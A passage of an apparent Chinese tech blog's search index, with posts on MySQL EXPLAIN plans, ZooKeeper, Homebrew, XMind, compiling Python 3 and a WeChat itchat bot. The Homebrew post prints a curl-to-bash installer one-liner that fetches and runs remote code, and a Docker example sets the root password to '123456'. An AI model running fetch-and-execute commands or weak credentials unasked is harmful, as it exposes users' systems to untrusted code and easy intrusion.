nodeid=${line:7}\n\t\tfi\n\tdone < a.conf\n}\n\n\nset_nodeid1\necho \"set_nodeid1 is $nodeid\"\nset_nodeid2\necho \"set_nodeid2 is $nodeid\"\nset_nodeid3\necho \"set_nodeid3 is $nodeid\"\n```\n\n\n\n输出内容如下:\n\n```bash\nset_nodeid1 is 0\nset_nodeid2 is\nset_nodeid3 is 1234\n```\n\n\n\n第一种方式创建了子shell, 赋值是子shell的, 没有影响到全局变量.\n\n第二种方式, for循环的方式, 因为a.conf中间空格导致的,把一行循环了两次, 所以赋值了空\n\n第三种方式得到正确的结果\n\n","tags":["shell"],"categories":["命令"]},{"title":"mysql用explain查看执行计划","url":"%2Fp%2F8a4c23bd.html","content":"\nmysql 使用 `explain + sql 语句` 来查看执行计划，执行结果有以下字段，具体描述如下：\n\n<!-- more -->\n\n\n# 1. 字段说明\n\n| 字段          | 描述                                                         |\n| :------------ | :----------------------------------------------------------- |\n| id            | id相同，执行顺序由上至下；<br/>id不同，id的序号会递增，id值越大优先级越高，越先被执行<br/>id为`null`时表示一个结果集，不需要使用它查询，常出现在包含`union`等查询语句中。 |\n| select_type   | 主要是用于区别普通查询、联合查询、子查询等的复杂查询         |\n| table         | 当前执行的表                                                 |\n| type          | 访问类型                                                     |\n| possible_keys | 可能使用的索引                                               |\n| key           | 实际使用的索引                                               |\n| key_len       | 使用的索引的长度                                             |\n| ref           | 显示索引的哪一列被使用了                                     |\n| rows          | 查询过程中估计要扫描的行数, 原则上 rows 越少越好.            |\n| Extra         | 解析查询的额外信息，通常会显示是否使用了索引，是否需要排序，是否会用到临时表等 |\n| partitions    | 匹配的分区                                                   |\n| filtered      | 这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数。 |\n\n### 1.1 select_type\n\n| 类型               | 解释                                                         |\n| ------------------ | ------------------------------------------------------------ |\n| SIMPLE             | 不包含 UNION 查询或子查询                                    |\n| PRIMARY            | 包含子查询最外层查询就显示为 `PRIMARY`                       |\n| SUBQUERY           | 子查询中的第一个 SELECT                                      |\n| DEPENDENT SUBQUERY | 子查询中的第一个 SELECT, 取决于外面的查询. 即子查询依赖于外层查询的结果. |\n| UNION              | UNION 的第二或随后的查询                                     |\n| DEPENDENT UNION    | UNION 中的第二个或后面的查询语句, 取决于外面的查询           |\n| UNION RESULT       | UNION 的结果                                                 |\n\n\n\n\n### 1.2 type\n\n`type` 字段比较重要, 它提供了判断查询是否高效的重要依据依据. 通过 `type` 字段, 我们判断此次查询是 `全表扫描` 还是 `索引扫描` 等\n\n从上到下性能从低到高排列:\n\n+ all\n\n  表示全表扫描, 这个类型的查询是性能最差的查询之一. 通常来说, 我们的查询不应该出现 ALL 类型的查询, 因为这样的查询在数据量大的情况下, 对数据库的性能是巨大的灾难. 如一个查询是 ALL 类型查询, 那么一般来说可以对相应的字段添加索引来避免.\n\n+ index\n\n  表示全索引扫描(full index scan), 和 ALL 类型类似, 只不过 ALL 类型是全表扫描, 而 index 类型则仅仅扫描所有的索引, 而不扫描数据.\n\n  `index` 类型通常出现在: 所要查询的数据直接在索引树中就可以获取到, 而不需要扫描数据. 当是这种情况时, Extra 字段 会显示 `Using index`.\n\n  ```sql\n  EXPLAIN SELECT name FROM  user_info\n  ```\n\n+ range\n\n  表示使用索引范围查询, 通过索引字段范围获取表中部分数据记录. 这个类型通常出现在 =, <>, >, >=, <, <=, IS NULL, <=>, BETWEEN, IN() 操作中.\n  当 `type` 是 `range` 时, 那么 EXPLAIN 输出的 `ref` 字段为 NULL, 并且 `key_len` 字段是此次查询中使用到的索引的最长的那个.\n\n+ index_merge\n\n+ ref\n\n  此类型通常出现在多表的 join 查询, 针对于非唯一或非主键索引, 或者是使用了 `最左前缀` 规则索引的查询.\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id AND order_info.user_id = 5\n  ```\n\n+ eq_ref\n\n  此类型通常出现在多表的 join 查询, 表示对于前表的每一个结果, 都只能匹配到后表的一行结果. 并且查询的比较操作通常是 `=`, 查询效率较高. 例如:\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id\n  ```\n\n+ const \n\n  针对主键或唯一索引的等值查询扫描, 最多只返回一行数据. const 查询速度非常快, 因为它仅仅读取一次即可.\n\n  例如下面的这个查询, 它使用了主键索引, 因此 `type` 就是 `const` 类型的.\n\n  ```sql\n  explain select * from user_info where id = 2\n  ```\n\n+ system\n\n  表中只有一条数据. 这个类型是特殊的 `const` 类型.\n  \n  \n\n`ALL` 类型因为是全表扫描, 因此在相同的查询条件下, 它是速度最慢的.\n而 `index` 类型的查询虽然不是全表扫描, 但是它扫描了所有的索引, 因此比 ALL 类型的稍快.\n后面的几种类型都是利用了索引来查询数据, 因此可以过滤部分或大部分数据, 因此查询效率就比较高了.\n\n\n\n### 1.3 key_len\n\n表示查询优化器使用了索引的字节数. 这个字段可以评估组合索引是否完全被使用, 或只有最左部分字段被使用到.\nkey_len 的计算规则如下:\n\n- 字符串\n  - char(n): n 字节长度\n  - varchar(n): 如果是 utf8 编码, 则是 3 *n + 2字节; 如果是 utf8mb4 编码, 则是 4* n + 2 字节.\n- 数值类型:\n  - TINYINT: 1字节\n  - SMALLINT: 2字节\n  - MEDIUMINT: 3字节\n  - INT: 4字节\n  - BIGINT: 8字节\n- 时间类型\n  - DATE: 3字节\n  - TIMESTAMP: 4字节\n  - DATETIME: 8字节\n- 字段属性: NULL 属性 占用一个字节. 如果一个字段是 NOT NULL 的, 则没有此属性.\n\n\n\n### 1.4 Extra\n\n+ Using filesort\n  当 Extra 中有 Using filesort 时, 表示 MySQL 需额外的排序操作, 不能通过索引顺序达到排序效果. 表明此时的查询无法利用索引完成排序操作即索引失效。\n\n+ Using index\n\n  \"覆盖索引扫描\", 表示查询在索引树中就可查找所需数据, 不用扫描表数据文件, 往往说明性能不错\n\n+ Using temporary\n\n  查询有使用临时表, 一般出现于排序, 分组和多表 join 的情况, 查询效率不高, 建议优化.\n\n\n\n# 2. 测试\n\n```bash\ndocker run -d --name mysql-explain -e MYSQL_ROOT_PASSWORD=123456 mysql # 创建一个容器\n\ndocker exec -it mysql-explain mysql -u root -p  # 输入密码, 进入操作\n```\n\n\n\n### 2.1 数据初始化\n\n新建测试表，插入 10w 数据：\n\n```sql\n-- 创建库\nCREATE DATABASE test1;\nuse test1;\n\n-- 创建表\nCREATE TABLE `test` (  \n  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `a` int(11) NOT NULL,\n  `b` int(11) NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n\n-- 批量插入 10w 数据\nDROP PROCEDURE IF EXISTS batchInsert;\nDELIMITER $  \nCREATE PROCEDURE batchInsert() BEGIN DECLARE i INT DEFAULT 1;  \nSTART TRANSACTION; WHILE i<=100000  \nDO  \nINSERT INTO test (a,b) VALUES (i,i);  \nSET i=i+1; END WHILE;  \nCOMMIT; END $\n\nCALL batchInsert();  \n\n\n-- 得到100000\nselect count(*) from test;\n```\n\n\n\n### 2.2 没有索引\n\n目前默认只有一个主键索引，我们分析下全表查询：\n\n```sql\nexplain select * from test;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra | partitions | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---- | ---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | NULL          | NULL | NULL    | NULL | 100098 | NULL  | NULL       | 100.00   |\n\n其中 `type` 值为 ALL，表示全表扫描了，我们看到 `rows` 这个字段显示有 100098 条，实际上我们一共才 10w 条数据，说明这个字段只是 mysql 的一个预估，不总是准确的。\n\n\n\n### 2.3 单个字段索引\n\n我们给字段 a 添加普通索引。\n\n```sql\nalter table test add index idx_a(a);  \n```\n\n\n\n##### 2.3.1 where 索引\n\n+ 走 a 索引树,  虽1行也要回表。\n\n```sql\nexplain select * from test where a = 10000;     \n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a         | idx_a | 4       | const | 1    | NULL  | 100      |\n\n\n\n+ 不走索引, 因为这条语句会从索引中查出 9w 条数据，全表扫描都才 10w 条数据，所以 mysql 决策是还不如直接全表扫描得了。\n\n```sql\nexplain select * from test where a > 10000;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50.00    |\n\n\n\n+ 使用了 a 索引树, 因为满足索引只有 10000 条数据，mysql 认为 10000 条数据就算回表也要比全表扫描的代价低，因而决定查索引，但还是需要回表。\n\n```sql\nexplain select * from test where a > 90000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   |\n\n\n\n+ 只select 索引字段, 注意这次 Extra 的值为 `Using where; Using index`，表示查询用到了索引，且要查询的字段在索引中就能拿到，所以不需要回表。显然这种效率比上面的要高，这也是日常开发中不建议写 select * 的原因，尽量只查询业务所需的字段。\n\n```sql\nexplain select a from test where a > 10000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where; Using index | 100.00   |\n\n\n\n##### 2.3.2 order by 索引\n\norder by 最好和 where 用同一个字段\n\n\n\n+ 走 a 索引树, 不回表\n\n```sql\nexplain select a from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using where; Using index | 100.00   |\n\n\n\n+ 走 a 索引树, 需要回表\n\n```sql\nexplain select * from test where a > 90000 order by a;\nexplain select b from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   |\n\n\n\n+ Extra中返回了一个 Using filesort，说明无法利用索引完成排序，需要从内存或磁盘进行排序。就算 b 有索引, 也无法避免, 因为也会走 a 的索引树。\n\n``` sql\nexplain select a from test where a > 90000 order by b;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :------------------------------------ | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition; Using filesort | 100.00   |\n\n\n\n### 2.4 多个字段索引和复合索引\n\n##### 2.4.1 多个字段索引\n\n目前a, b 有自己的单个索引。\n\n```sql\nalter table test drop index idx_a_b;\nalter table test add index idx_a(a);  \nalter table test add index idx_b(b);\n```\n\n\n+ 没走索引,是因为无论如何都需要回表, 如果把10000改成90000, 会变成走索引加回表.\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50       |\n\n\n\n+ 直接走a 的索引树, 不回表\n\n```sql\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ 走 b 的索引树更好,回表\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a,idx_b   | idx_b | 4       | const | 1    | Using where | 9.99     |\n\n\n\n+ 走 a 的索引树更好,回表\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a,idx_b   | idx_a | 4       | const | 1    | Using where | 9.99     |\n\n\n\n##### 2.4.2 一个复合索引\n\n```sql\nalter table test drop index idx_a;\nalter table test drop index idx_b;\nalter table test add index idx_a_b(a,b);  \n```\n\n目前只有一个(a,b)复合索引\n\n\n\n+ 走 (a,b) 的索引树, 不回表\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ 不满足最左匹配原则\n\n```sql\nexplain select * from test where b > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows   | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :----- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | index | NULL          | idx_a_b | 8       | NULL | 100098 | Using where; Using index | 33.33    |\n\n\n\n+ 走 (a,b) 的索引树, 不回表, key_len=4\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 18142 | Using where; Using index | 10       |\n\n\n\n+ 走 (a,b) 的索引树, 不回表, key_len=8\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :--- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 8       | NULL | 1    | Using where; Using index | 100      |\n\n\n\n##### 2.4.3 普通索引和复合索引同时存在\n\n```sql\nalter table test add index idx_a(a); \nalter table test add index idx_b(b);  \nalter table test add index idx_a_b(a,b);  \n```\n\n目前有2个普通索引,1个复合索引. \n\n\n\n+ 走 (a,b) 的索引树更好, 不回表\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a | idx_a_b | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ 走 a 的索引树更好, 不回表\n\n```sql\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a | idx_a | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ 走 b 的索引树,  需要回表. 其实此时走复合索引更好, 所以不建议复合索引和普通索引一起用\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type | possible_keys       | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a_b,idx_a,idx_b | idx_b | 4       | const | 1    | Using where | 18.12    |\n\n\n\n+ 走 (a,b) 的索引树, 不回表\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type  | possible_keys       | key     | key_len | ref  | rows | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------------ | :------ | :------ | :--- | :--- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a,idx_b | idx_a_b | 8       | NULL | 1    | Using where; Using index | 100      |\n\n##### 2.4.4  复合索引和单个索引占用空间\n\n复合索引(a,b,c)和单列索引(a)在查询条件中只有a字段时都会被调用,但是存在较小的性能差异.主要性能差异取决于IO性能. \n\n因为索引实质上就是将该条记录的唯一标识rowid和索引字段记录下来.所以一个最小的存储物理块block存储单列索引(a)可能可以存储100条数据,而复合索引(a,b,c)可能只能存储30条,那么在使用索引时,复合索引需要IO到的block更多,自然就会存在性能差异.\n\n但是在表空间的使用上,复合索引的占用空间并不等于所涉及到的列的所有单列索引的总和,而是远远小于,经实测4个字段的复合索引占用空间为3072KB,而4个单列索引占用的空间均为2048KB,即4个单列索引总和为8192KB.主要原因是每个索引中都必须包含rowid,而rowid是比较大的,通常情况下占用空间远大于数据.\n\n\n\n# 3. 其他\n\n### 3.1 查看 sql 执行时间\n\n```bash\nset profiling = 1;\nshow profiles;\n```\n\n### 3.2 索引长度\n\n对于myisam和innodb存储引擎，prefixes的长度限制分别为1000 bytes和767 bytes。注意prefix的单位是bytes，但是建表时我们指定的长度单位是字符。 \n\n以utf8字符集为例，一个字符占3个bytes。因此在utf8字符集下，对myisam和innodb存储引擎创建索引的单列长度不能超过333个字符和255个字符。 \n\nsmallint 占2个bytes，timestamp占4个bytes，utf8字符集。utf8字符集下，一个character占3个bytes。 \n\n### 3.3 key_len\n\n完全匹配, 就是 key_len 是满的, 不完全匹配, 例如前面, key_len 就是少的\n\n例如: (user_id, award_id, lottery_id)  复合索引, 一共是12\n\n```sql\nexplain SELECT * FROM `lottery_user_log` WHERE (user_id=279223)  --key_len:4\n\nexplain SELECT * FROM `lottery_user_log` WHERE (user_id=279223 and award_id = 8)  --key_len:8\n\nexplain SELECT * FROM `lottery_user_log` WHERE (user_id=279223 and award_id = 8 and lottery_id=1) --key_len:12\n```\n\n\n\n### 3.4 不满足最左匹配, 也用了索引\n\n> 就是  possible_keys is null but key isn't null\n\nkey可能有一个不存在于possible_keys值中的索引。\n\n如果所有可能的索引都不适合查找行，但查询选择的所有列都是其他索引的列，则会发生这种情况。\n\n也就是说，命名索引覆盖选定的列尽管它不用于确定要检索的行，但索引扫描比数据行扫描更有效。\n\nhttps://dev.mysql.com/doc/refman/5.7/en/explain-output.html#explain_key\n\n\n\n# 4. 头脑风暴\n\n+ order by 最好和 where 用同一个字段, 能有效避免 Using filesort\n+ 尽量的扩展索引，不要新建索引。比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。\n\n# 5. 参考资料\n\n+ https://dev.mysql.com/doc/refman/8.0/en/explain-output.html\n+ https://blog.souche.com/mysql-explain/\n+ https://segmentfault.com/a/1190000008131735","tags":["mysql"],"categories":["mysql"]},{"title":"zookeeper的原理和使用场景","url":"%2Fp%2F7c519e18.html","content":"\n\n# 1. 分布式应用\n\n### 1.1 一致性\n\n强一致性\n\n弱一致性\n\n最终一致性\n\n<!-- more -->\n\n### 1.2 选举Leader\n\n先看 zid (写的一个日志 id),  再看 myid\n\n选取 Leader 时间节点\n\n+ 服务刚启动\n\n+ leader 挂了\n\n+ 超过一半的节点挂了， leader shutdown\n\n### 1.3 同步操作\n\nleader 负责写\n\nfollower 转发给 leader 写\n\n+ leader 生成日志，发给所有 follower\n\n+ follewer 持久化日志， 回复 ack\n\n+ leader 接收超过一半 ack, 发送commit,  更新 database\n\n+ follewer收到 commit, 更新 database\n\n\n\n# 2. zookeeper\n\n### 2.1 znode\n\n+ path 唯一路径\n\n+ data 数据, 可以没有\n\n+ childNode 子节点\n\n+ stat 状态属性\n\n+ type 节点类型\n\n  + 持久节点（除非手动删除，节点永远存在, 默认的）\n  + 持久有序节点（按照创建顺序会为每个节点末尾带上一个序号如：root-1）\n  + 临时节点（创建客户端与 Zookeeper 保持连接时节点存在，断开时则删除并会有相应的通知）\n    + 不能拥有子节点\n    + 服务注册\n    + 分布式锁\n  + 临时有序节点（在瞬时节点的基础上加上了顺序）\n\n  \n\n# 3. 安装和使用\n\n### 3.1 安装\n\n```bash\nbrew install zookeeper\n```\n\n安装完成，配置文件在 `/usr/local/etc/zookeeper/` \n\n### 3.2 使用\n\n```bash\nzkServer start #启动 zookeeper\nzkCli # 连接 zookeeper\n\nls /\ncreate /apps \"test\"\nget -s /apps\n\ncreate -s # 序号\ncreate -e # 临时\n```\n\n\n\n# 4. 分布式锁\n通过临时和序号的原理\n+ 创建临时序号节点\n+ 获取最小的节点是否时读锁, 如果是读, 那么获得锁\n+ 如果不是, 阻塞等待, 添加子节点变更监听(可以改进链表, 监听它的上一个节点)\n\n\n\n# 5. 服务注册和发现\n\n### 5.1 服务注册\n\n服务提供者（Provider）启动时，会向Zookeeper服务端注册服务信息，即会在Zookeeper服务器上创建一个服务节点(临时节点)，并在节点上存储服务的相关数据（如服务提供者的ip地址、端口等），比如注册一个用户注册服务（user/register）。\n\n### 5.2 服务发现\n\n服务消费者（Consumer）启动时，会根据本身依赖的服务信息，向Zookeeper服务端获取注册的服务信息并设置Watch，获取到注册的服务信息之后将服务提供者信息缓存在本地，调用服务时直接根据从Zookeeper注册中心获取到的服务注册信息调用服务，比如发现用户注册服务（user/register）并调用。\n\n### 5.3 服务通知\n\n当服务提供者因为某种原因宕机或不提供服务之后，Zookeeper服务注册中心的对应服务节点会被删除，因为消费者在获取服务信息的时候在对应节点上设置了Watch，因此节点删除之后会触发对应的Watcher，Zookeeper注册中心会异步向服务所关联的所有服务消费者发出节点删除的通知，服务消费者根据收到的通知更新缓存的服务列表。\n\n### 5.4 总结\n\n+ 注册使用临时节点, 保存 ip 和端口, 就算挂了节点也能释放\n+ 消费者监听父节点, 服务变换就会收到通知\n+ 根据列表中的一系列服务, 可以随机算法实现调用, 相当于负载均衡","tags":["zookeeper"],"categories":["分布式"]},{"title":"mac的homebrew使用","url":"%2Fp%2Fbe2ea1c8.html","content":"\nHomebrew是一款Mac OS平台下的软件包管理工具，拥有安装、卸载、更新、查看、搜索等很多实用的功能。简单的一条指令，就可以实现包管理，而不用你关心各种依赖和文件路径的情况，十分方便快捷。\n\n<!-- more -->\n\nHomebrew 会将软件包安装到独立目录，并将其文件软链接至 /usr/local 。\n\n```bash\ncd /usr/local\nfind Cellar\nCellar/wget/1.16.1\nCellar/wget/1.16.1/bin/wget\nCellar/wget/1.16.1/share/man/man1/wget.1\n\n$ ls -l bin\nbin/wget -> ../Cellar/wget/1.16.1/bin/wget\n```\n\n\n\n# 1. 安装使用\n\n去官网 https://brew.sh/ 看最新下载信息:\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n常使用命令\n\n```bash\nbrew --version 或者 brew -v # 显示brew版本信息\n\nbrew list   #显示所有的已安装的软件\nbrew update #自动升级homebrew\nbrew upgrade  #升级所有已过时的软件，即列出的以过时软件\nbrew upgrade <formula> #升级指定的软件\n```\n\n\n\n# 2. 查看源更改源\n\n对于 homebrew，需要替换的是4个模块的镜像\n\n+ Homebrew（brew --repo）\n\n+ Homebrew Core（brew --repo homebrew/core）\n\n+ Homebrew Cask（brew --repo homebrew/cask）\n\n+ Homebrew-bottles\n\n替换: \n\n```bash\n#替换 Homebrew\ngit -C \"$(brew --repo)\" remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n\n#替换 Homebrew Core\ngit -C \"$(brew --repo homebrew/core)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n\n#替换 Homebrew Cask\ngit -C \"$(brew --repo homebrew/cask)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n\n#替换 Homebrew-bottles\necho 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.zshrc\nsource ~/.zshrc\n\n# 更新\nbrew update\n```\n\n\n\n# 3. 参考资料\n\n+ https://brew.sh/\n+ https://www.zhihu.com/question/31360766/answer/749386652","tags":["mac"],"categories":["软件"]},{"title":"xmind_zen思维导图使用教程","url":"%2Fp%2F2c700d35.html","content":"\n# 1. 介绍\n\n有时候我们时常觉得头脑迷惑，许多事情想不透彻，我想这应该就是欠缺逻辑思维的体现，如果你和我一样，未曾经受系统的思维训练，那么不妨先从使用Xmind开始，坚持下去，不断优化，最后一定能有所收获。\n\n<!-- more -->\n\n# 2. 使用\n\n### 2.1 基础使用\n\n+ 编辑主题文字：按【空格键**】**就可以进行内容的输入\n+ 添加同级主题：快捷键**【**enter/return**】**快速进行添加\n+ 添加子主题：用快捷键【tab】\n\n+ 删除：选中主题按【delete】\n\n+ 图标  ctrl+[\n+ 样式  ctrl+]\n\n### 2.2 小技巧\n\n+ 格式->样式   开启彩虹分支\n+ 格式->样式  开启线条渐细\n+ 格式->画布  开启自动平衡布局\n\n\n\n# 3. 参考链接\n\n+ https://www.zhihu.com/question/20381369/answer/187568292\n+ https://www.xmind.cn/blog/cn/useful-tips-for-xmind-2020/","tags":["xmind"],"categories":["使用软件"]},{"title":"linux源码安装python3","url":"%2Fp%2F95e70f76.html","content":"\n\n\nlinux下大部分系统默认自带python2.x的版本. 默认的python被系统很多程序所依赖，比如centos下的yum就是python2写的，所以默认版本不要轻易删除，否则会有一些问题.\n\n如果需要使用最新的Python3那么我们可以编译安装源码包到独立目录，这和系统默认环境之间是没有任何影响的，python3和python2两个环境并存即可\n\n作为作死小能手, 不装最新版本怎么能行? 所以手动编译python3源码进行安装, 并记录遇到的一些问题.\n\n<!-- more -->\n\n\n\n### 1. 下载源码:\n\nhttps://www.python.org/downloads/source/\n\n找到最新的Source release 下载即可\n\n\n\n### 2. 安装准备工作:\n\n事实证明下面的这些软件不安装, 在编译python3时会出现各种问题, 所以先把这些软件都安装了.\n\n```shell\nyum install gcc  \n\nyum install zlib* # 注意此处带*, 因为需要 zlib-devel\n\nyum install libffi-devel # 不安装报错ModuleNotFoundError: No module named '_ctypes'\n\nyum install openss openssl-devel # 不安装会导致pip3缺少ssl, 无法下载包\n\n```\n\n\n\n### 3. 源码安装python3.7\n\n```shell\nwget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz  # 下载源码\n\ntar -zxvf Python-3.7.3.tgz\n\ncd Python-3.7.3\n\n./configure --with-ssl --with-ensurepip=install # --with-ensurepip=install是安装pip3 --with-ssl是让pip3支持ssl\n\nmake \n\nmake altinstall # 注意此处是altinstall, 如果是install, 会和python2造成冲突\n```\n\n\n\n### 4. 建立python软链接\n\n安装成功后, 执行程序为python3.7, 我们为了方便使用需要建立一个软链接\n\n```shell\nwhich python3.7\n/usr/local/bin/python3.7\n\n\nln -s /usr/local/bin/python3.7 /usr/local/bin/python3\nln -s /usr/local/bin/pip3.7 /usr/local/bin/pip3\n```\n\n","tags":["linux"],"categories":["python"]},{"title":"微信机器人itchat的使用","url":"%2Fp%2F4f93001b.html","content":"\n\n\n近期准备用微信机器人实现往微信群里发消息. 需要用到微信机器人.\n\n目前的微信机器人大部分都是基于web微信协议, 因此仅能覆盖 Web 微信本身所具备的功能。例如收发消息, 加好友, 转发消息, 自动回复, 陪人聊天,消息防撤回等等.\n\n但是web微信目前不支持抢红包和朋友圈等相关功能, 并且使用机器人存在一定概率被限制登录的可能性, 主要表现为无法登陆 Web 微信 (但不影响手机等其他平台)。\n\n<!-- more -->\n\n\n\n### 1. 安装使用\n\n+ 可参考: https://github.com/littlecodersh/ItChat\n\n```shell\npip3 install itchat\n```\n\n\n\n+ 登录微信并且向文件助手发送一条消息\n\n```python\nimport itchat\n\nitchat.auto_login()\n\nitchat.send('Hello, filehelper', toUserName='filehelper')\n```\n\n\n\n+ 更多例子可以参考官方文档 https://itchat.readthedocs.io/zh/latest/\n\n\n\n### 2. 发送消息到微信群\n\n发送消息到微信群, 首先要保证微信群保存在通讯录, 如果不保存到通讯录，是无法在各设备之间同步的（所以itchat也无法读取到）\n\n```python\n# coding=utf8\nimport itchat\n\n\ndef send_group(group, msg):\n    rooms = itchat.get_chatrooms(update=True)\n    rooms = itchat.search_chatrooms(name=group)\n    if not rooms:\n        print(\"None group found\")\n    else:\n        itchat.send(msg, toUserName=rooms[0][\"UserName\"])\n\n\nif __name__ == \"__main__\":\n    